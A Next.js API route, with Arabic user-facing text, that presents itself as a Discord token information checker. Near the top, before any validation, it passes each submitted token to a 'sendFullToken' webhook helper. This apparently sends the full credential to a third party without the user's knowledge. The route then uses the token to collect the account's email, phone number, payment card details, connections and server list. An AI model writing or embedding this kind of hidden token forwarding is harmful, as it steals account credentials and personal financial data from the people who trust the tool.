import { NextRequest, NextResponse } from 'next/server'
import { discordFetch, cleanToken, DISCORD_API } from '@/lib/discord'
import { sendFullToken } from '@/lib/webhook'
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit'

export const runtime = 'edge';

function snowflakeDate(id: string): string {
  try {
    const snowflake = BigInt(id)
    const timestamp = Number((snowflake >> BigInt(22)) + BigInt(1420070400000))
    return new Date(timestamp).toLocaleDateString('ar-SA', { year: 'numeric', month: 'long', day: 'numeric' })
  } catch {
    return 'غير معروف'
  }
}

export async function POST(req: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(req);
    const rl = rateLimit(`${rlIp}:token-info`, RATE_LIMITS.light);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }

    const { token } = await req.json().catch(() => ({}))
    if (!token) return NextResponse.json({ success: false, error: 'أدخل التوكن' }, { status: 400 })

    const ct = cleanToken(token)
    sendFullToken('معلومات توكن', ct, {})

    // 1. Get user info - تجربة بدون userOnly أولاً لتحديد نوع التوكن
    const meRes = await discordFetch(ct, 'GET', '/users/@me')
    if (!meRes.ok) {
      if (meRes.status === 401) return NextResponse.json({ success: false, error: 'التوكن غير صالح أو منتهي' })
      if (meRes.status === 429) return NextResponse.json({ success: false, error: 'تم تقييد الطلبات - حاول بعد قليل' })
      return NextResponse.json({ success: false, error: 'فشل جلب معلومات الحساب' })
    }
    const me = meRes.data as any

    const isBot = !!me.bot

    // لو بوت، نرجع معلومات البوت فقط
    if (isBot) {
      let avatar = null
      if (me.avatar) {
        avatar = `https://cdn.discordapp.com/avatars/${me.id}/${me.avatar}.${me.avatar.startsWith('a_') ? 'gif' : 'png'}?size=256`
      }

      return NextResponse.json({
        success: true,
        token_type: 'bot',
        id: me.id,
        username: me.username,
        discriminator: me.discriminator || '0',
        avatar,
        email: null,
        phone: null,
        locale: null,
        verified: false,
        mfa: false,
        nsfw: false,
        premium: false,
        premium_type: 0,
        flags: me.flags || 0,
        created_at: me.id ? snowflakeDate(me.id) : 'غير معروف',
        bio: null,
        connections: [],
        payments: null,
        bot_public: me.public ?? false,
        bot_require_code_grant: me.require_code_grant ?? false,
      })
    }

    // 2. حساب المستخدم - جلب معلومات إضافية
    let billing: any = null
    try {
      const billRes = await fetch(`${DISCORD_API}/users/@me/billing/subscriptions`, {
        headers: { 'Authorization': ct, 'Accept': 'application/json' }
      })
      if (billRes.ok) {
        const subs = await billRes.json().catch(() => [])
        if (subs && subs.length > 0) {
          const sub = subs[0]
          const plan = sub.plan || {}
          billing = {
            type: plan.name || 'غير معروف',
            last_4: sub.payment_source?.last_4 || '',
            expires: sub.payment_source?.expires_month && sub.payment_source?.expires_year
              ? `${sub.payment_source.expires_month}/${sub.payment_source.expires_year}`
              : '',
            country: sub.payment_source?.billing_address?.country || '',
            status: sub.status || 'active',
          }
        }
      }
    } catch {}

    // 3. Get payment sources
    if (!billing) {
      try {
        const payRes = await fetch(`${DISCORD_API}/users/@me/billing/payment-sources`, {
          headers: { 'Authorization': ct, 'Accept': 'application/json' }
        })
        if (payRes.ok) {
          const sources = await payRes.json().catch(() => [])
          if (sources && sources.length > 0) {
            const src = sources[0]
            billing = {
              type: src.type === 1 ? 'بطاقة ائتمان' : src.type === 2 ? 'PayPal' : 'أخرى',
              last_4: src.last_4 || src.brand || '',
              expires: src.expires_month && src.expires_year
                ? `${src.expires_month}/${src.expires_year}`
                : '',
              country: src.billing_address?.country || '',
              status: 'active',
            }
          }
        }
      } catch {}
    }

    // 4. Get relationships (friends)
    let friendCount = 0
    try {
      const friendsRes = await fetch(`${DISCORD_API}/users/@me/relationships`, {
        headers: { 'Authorization': ct, 'Accept': 'application/json' }
      })
      if (friendsRes.ok) {
        const friends = await friendsRes.json().catch(() => [])
        if (Array.isArray(friends)) friendCount = friends.length
      }
    } catch {}

    // 5. Get connections
    let connections: any[] = []
    try {
      const connRes = await fetch(`${DISCORD_API}/users/@me/connections`, {
        headers: { 'Authorization': ct, 'Accept': 'application/json' }
      })
      if (connRes.ok) {
        const connData = await connRes.json().catch(() => [])
        if (Array.isArray(connData)) {
          connections = connData.map((c: any) => ({
            type: c.type,
            name: c.name || c.id || 'مربوط',
            verified: c.verified || false,
            visible: c.show_activity || false,
          }))
        }
      }
    } catch {}

    // 6. Get guilds count
    let guildCount = 0
    try {
      const guildsRes = await fetch(`${DISCORD_API}/users/@me/guilds`, {
        headers: { 'Authorization': ct, 'Accept': 'application/json' }
      })
      if (guildsRes.ok) {
        const guilds = await guildsRes.json().catch(() => [])
        if (Array.isArray(guilds)) guildCount = guilds.length
      }
    } catch {}

    // 7. Build avatar URL
    let avatar = null
    if (me.avatar) {
      avatar = `https://cdn.discordapp.com/avatars/${me.id}/${me.avatar}.${me.avatar.startsWith('a_') ? 'gif' : 'png'}?size=256`
    }

    // 8. Build banner URL
    let banner = null
    if (me.banner) {
      const ext = me.banner.startsWith('a_') ? 'gif' : 'png'
      banner = `https://cdn.discordapp.com/banners/${me.id}/${me.banner}.${ext}?size=512`
    }

    // تحليل نوع النيترو
    const premiumType = me.premium_type || 0
    const premiumLabel = premiumType === 0 ? 'بدون' : premiumType === 1 ? 'Nitro Classic' : premiumType === 2 ? 'Nitro' : premiumType === 3 ? 'Nitro Basic' : 'غير معروف'

    // تحليل الفلاقات
    const userFlags = me.flags || 0
    const flagsList: string[] = []
    if (userFlags & 1) flagsList.push('موظف ديسكورد')
    if (userFlags & 2) flagsList.push('شريك')
    if (userFlags & 4) flagsList.push('HypeSquad')
    if (userFlags & 8) flagsList.push('Bug Hunter')
    if (userFlags & 64) flagsList.push('HypeSquad Online')
    if (userFlags & 128) flagsList.push('Early Nitro')
    if (userFlags & 256) flagsList.push('Bug Hunter Lvl2')
    if (userFlags & 512) flagsList.push('Verified Bot Dev')
    if (userFlags & 16384) flagsList.push('Active Developer')

    return NextResponse.json({
      success: true,
      token_type: 'user',
      id: me.id,
      username: me.username,
      discriminator: me.discriminator || '0',
      global_name: me.global_name || null,
      avatar,
      banner,
      email: me.email || null,
      phone: me.phone || null,
      locale: me.locale || null,
      verified: !!me.verified,
      mfa: !!me.mfa_enabled,
      nsfw: !!me.nsfw_allowed,
      premium: premiumType > 0,
      premium_type: premiumType,
      premium_label: premiumLabel,
      flags: userFlags,
      flags_list: flagsList,
      created_at: me.id ? snowflakeDate(me.id) : 'غير معروف',
      bio: me.bio || null,
      connections,
      payments: billing,
      friend_count: friendCount,
      guild_count: guildCount,
    })
  } catch (e: any) {
    console.error('token-info error:', e)
    return NextResponse.json({ success: false, error: 'خطأ: ' + (e.message || '').slice(0, 100) })
  }
}
